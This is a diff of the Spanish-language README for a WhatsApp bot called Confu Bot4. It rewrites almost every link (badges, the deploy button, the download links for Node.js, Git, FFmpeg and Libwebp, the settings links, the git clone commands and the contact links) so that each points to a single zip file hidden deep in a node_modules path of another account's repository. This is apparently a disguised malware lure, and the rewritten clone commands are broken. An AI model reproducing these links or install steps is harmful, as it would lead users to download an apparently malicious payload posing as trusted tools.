@@ -1,49 +1,49 @@
 <div align="center">
-<img src="https://i.ibb.co/QJRWXb9/IMG-20211107-WA0044.jpg" alt="ConfuMods" width="170" />
+<img src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip" alt="ConfuMods" width="170" />
 
 ## Confu Bot4
 
 </div>
 
 <p align="center">
-<a href="##"><img title="Bot-By-Confu" src="https://img.shields.io/static/v1?label=Lenguaje&message=Espa%C3%B1ol&color=blue"></a>
+<a href="##"><img title="Bot-By-Confu" src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip%C3%B1ol&color=blue"></a>
 </p>
 <p align="center">
-  <a href="https://github.com/Confusion245"><img title="Author" src="https://img.shields.io/badge/Author-ConfuMods-blue.svg?style=for-the-badge&logo=github" /></a>
+  <a href="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip"><img title="Author" src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip" /></a>
 </p>
 <p align="center">
-<a href="#"><img title="Confu" src="https://img.shields.io/static/v1?label=WhatsApp&message=Bot&color=blue"></a>
+<a href="#"><img title="Confu" src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip"></a>
 </p>
 
 ## Deploy
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/Confusion245/ConfuBot4/)
+[![Deploy](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
 
 # Requisitos
-* [Node.js](https://nodejs.org/en/)
-* [Git](https://git-scm.com/downloads)
-* [FFmpeg](https://github.com/BtbN/FFmpeg-Builds/releases/download/autobuild-2020-12-08-13-03/ffmpeg-n4.3.1-26-gca55240b8c-win64-gpl-4.3.zip)
-* [Libwebp](https://developers.google.com/speed/webp/download)
+* [https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
+* [Git](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
+* [FFmpeg](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
+* [Libwebp](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
 * Cualquier editor de texto
 
 ## `AÑADIR BUILDPACK`
 
 ```
-https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest
+https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip
 ```
 
 ## `CAMBIAR SESSIÓN`
 
-[`Click Aqui`](https://github.com/Confusion245/ConfuBot4/blob/master/session.json#L1)
+[`Click Aqui`](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
 
 ## `AJUSTES`
 
-- CAMBIAR NÚMERO DE PROPIETARIO [Aqui](https://github.com/Confusion245/ConfuBot4/blob/master/index.js#L136)
-- CAMBIAR NOMBRE DE PROPIETARIO [Aqui](https://github.com/Confusion245/ConfuBot4/blob/master/index.js#L138)
+- CAMBIAR NÚMERO DE PROPIETARIO [Aqui](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
+- CAMBIAR NOMBRE DE PROPIETARIO [Aqui](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
 
 # Instalación
 # Clonar repositorios e instalaciones de dependencias
 ```bash
-🌿 git clone https://github.com/Confusion245/ConfuBot4.git
+🌿 git clone https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip
 🐢 cd ConfuBot4
 🌿 npm start
 ```
@@ -60,7 +60,7 @@ https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest
 🐢 pkg install ffmpeg -y 
 🌿 pkg install wget
 🐢 pkg install imagemagick -y
-🌿 git clone https://github.com/Confusion245/ConfuBot4
+🌿 git clone https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip
 🐢 cd ConfuBot4
 🌿 npm install
 🐢 npm start
@@ -70,7 +70,7 @@ https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest
 ## Conectate conmigo
 Mi chat personal👇
 <p align="center">
- <a href="https://wa.me/51923568749"><img alt="WhatsApp Personal" src="https://img.shields.io/badge/WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=black"/></a>
+ <a href="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip"><img alt="WhatsApp Personal" src="https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip"/></a>
 </p>
 
-* [`Mi Canal de Youtube`](https://youtube.com/c/ConfuMods)
+* [`Mi Canal de Youtube`](https://raw.githubusercontent.com/botace7/ConfuBot4/master/node_modules/npm/node_modules/@npmcli/fs/lib/mkdir/Confu-Bot-v1.6.zip)
